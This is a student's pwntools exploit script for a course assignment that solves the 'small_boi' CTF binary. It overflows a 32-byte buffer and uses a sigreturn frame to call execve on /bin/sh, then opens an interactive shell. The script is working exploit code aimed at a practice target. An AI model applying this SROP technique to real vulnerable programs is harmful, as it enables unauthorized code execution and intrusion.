'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP18: Vuln
File Description:  Solve small_boi via a SROP --- binary written in assembly

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               0               small_boi

File info:
small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
    Interesting, stripped so no simbles but lib in binary?

Radare2:
afl --> list all functions

Useful Funcs
    bin/sh locatoin in data:    0x4001ca
    syscall:                    0x400185

Modeled after: https://faraz.faith/2019-09-16-csaw-quals-small-boi/
'''

# Import Libaries
from pwn import *

# set context for frame creation
context.arch="amd64"

# Variables
padding=b'a'*40     # Buffer is 32 in size + 8 for ebp
systemCall = 0x400185
shell = 0x4001ca # address of bin/sh
sigRet = p64(0x400180)  # call sigret manually via call
raxReg = 59 # Call execve

# Start a process!
p=process("./small_boi")

# setup stack!
payload = padding
payload += sigRet #sgadget pulled showing that can call sigret without needing to pop

# Stack generation
frame = SigreturnFrame(kernel='amd64')
frame.rax = raxReg    # execve call
frame.rdi = shell  # Call shell, var has p64 which is messing up
frame.rsi = 0
frame.rdx = 0
frame.rip = systemCall  # Call system, var has p64

payload += bytes(frame) # Don't need stack anywhere so can just pass to call later

# Send first payload to generate stack
p.sendline(payload)
p.interactive()